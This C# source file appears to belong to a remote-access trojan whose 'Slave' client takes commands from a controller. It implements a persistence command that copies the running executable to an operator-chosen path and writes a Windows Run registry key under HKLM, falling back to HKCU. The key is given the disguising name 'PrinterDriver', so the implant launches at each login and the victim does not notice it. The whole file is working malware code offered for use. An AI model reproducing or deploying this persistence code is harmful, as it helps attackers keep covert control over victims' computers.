using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using Shared;
using Slave.Core;

namespace Slave.Commands
{
    internal class Persistance : ICommand
    {
        public string name { get; } = "persistance";

        public void Process(List<string> args)
        {
            var path = args[0];
            if (!CopyFileToDestination(path))
            {
                // File couldn't be copied, abort
                GlobalCommandsManager.networkManager.WriteLine("KO");
                return;
            }
            // File copied at <path>
            GlobalCommandsManager.networkManager.WriteLine("OK");


            // Try to install the persistance at machine level, it required admin privileges
            if (SetPersistanceRegistryKey(path, true))
            {
                GlobalCommandsManager.networkManager.WriteLine("OK");
            }
            else
            {
                GlobalCommandsManager.networkManager.WriteLine("KO");
                // Couldn't write the key, setting it at current user level
                if (SetPersistanceRegistryKey(path, false))
                {
                    GlobalCommandsManager.networkManager.WriteLine("OK");
                }
                else
                {
                    // Unsuccessfull operation
                    GlobalCommandsManager.networkManager.WriteLine("KO");
                    try
                    {
                        // Remove copied executable
                        File.Delete(path);
                    }
                    catch (Exception)
                    {
                        // Ignored
                    }
                }
            }
        }

        bool CopyFileToDestination(string path)
        {
            try
            {
                File.Copy(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, path);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        bool SetPersistanceRegistryKey(string value, bool localMachine)
        {
            // "PrinterDriver" is a dummy name
            var valueName = "PrinterDriver";
            var keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

            try
            {
                if (localMachine)
                {
                    Registry.LocalMachine.OpenSubKey(keyPath, true).SetValue(valueName, value);
                }
                else
                {
                    Registry.CurrentUser.OpenSubKey(keyPath, true).SetValue(valueName, value);
                }
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
